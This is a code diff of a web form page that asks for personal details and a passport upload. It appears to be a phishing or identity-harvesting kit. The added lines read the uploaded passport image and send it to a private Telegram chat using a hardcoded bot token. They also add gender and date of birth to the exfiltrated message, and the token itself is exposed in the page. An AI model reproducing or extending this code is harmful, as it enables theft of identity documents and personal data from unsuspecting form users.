@@ -207,7 +207,7 @@ input[type="date"] {
   /* Style the custom label */
   .custom-file-label {
 	display: block;
-	margin-bottom: 20px;
+	margin-bottom: 30px;
     padding: 5px 20px;
 	border: 1px solid #ddd; 
     border-radius: 5px;
@@ -310,9 +310,9 @@ blockquote {
 
 		 <label for="employ">Employment Status</label>
 		 <select id="employ" name="employ">
+			 <option value="Self-Employed">Self-Employed</option>
 			 <option value="Student">Student</option>
 			 <option value="Employed">Employed</option>
-			 <option value="Self-Employed">Self-Employed</option>
 			 <option value="Unemployed">Unemployed</option>
 		 </select>
 		 
@@ -432,6 +432,8 @@ closeAdButton.addEventListener("click", slideOutAd);
 	// Important parameters
 	  const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
 	  const TELEGRAM_CHAT_ID = '6049368044';
+	  const input = document.getElementById('passport');
+      const file = input.files[0];
 
 	  // Proper parameter naming
 function sendImageToTelegram(botToken, chatId) {
@@ -492,10 +494,14 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
+                           `👤 Gender: ${data.gender}\n` +
+                           `👤 Date of Birth: ${data.dob}\n` +
                            `📧 Email: ${data.email}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
+		
+			sendImageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
                 showForm('form2');
             
